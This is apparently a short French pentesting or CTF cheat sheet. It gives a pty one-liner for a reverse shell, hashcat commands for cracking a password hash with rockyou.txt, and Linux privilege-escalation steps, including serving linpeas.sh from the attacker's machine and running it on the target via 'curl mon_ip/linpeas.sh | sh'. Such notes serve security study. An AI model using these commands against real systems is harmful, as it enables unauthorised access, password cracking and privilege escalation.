# Dans un reverse shell

```py
python3 -c "import pty;pty.spawn('/bin/bash')"
```

# Détecter un hash 

```bash
hashcat hashPWD.txt rockyou.txt

The following 11 hash-modes match the structure of your input hash:

      # | Name                                                | Category
  ======+=====================================================+======================================
    900 | MD4                                                 | Raw Hash
      0 | MD5                                                 | Raw Hash
     70 | md5(utf16le($pass))                                 | Raw Hash
   2600 | md5(md5($pass))                                     | Raw Hash salted and/or iterated
   3500 | md5(md5(md5($pass)))                                | Raw Hash salted and/or iterated
   4400 | md5(sha1($pass))                                    | Raw Hash salted and/or iterated
  20900 | md5(sha1($pass).md5($pass).sha1($pass))             | Raw Hash salted and/or iterated
   4300 | md5(strtoupper(md5($pass)))                         | Raw Hash salted and/or iterated
   1000 | NTLM                                                | Operating System
   9900 | Radmin2                                             | Operating System
   8600 | Lotus Notes/Domino 5                                | Enterprise Application Software (EAS)


```

Puis sélectionner le # de l'algo de hashage
Exemple avec RAW MD5
```bash
hashcat -m 0 hashPWD.txt rockyou.txt
```


# Privilege Escalation

## Linux

`sudo -l`

`python -m http.server 80 -> curl mon_ip/linpeas.sh | sh`

`find / -type f -perm -04000 -ls 2>/dev/null`
`find / -perm -4000 2>/dev/null`



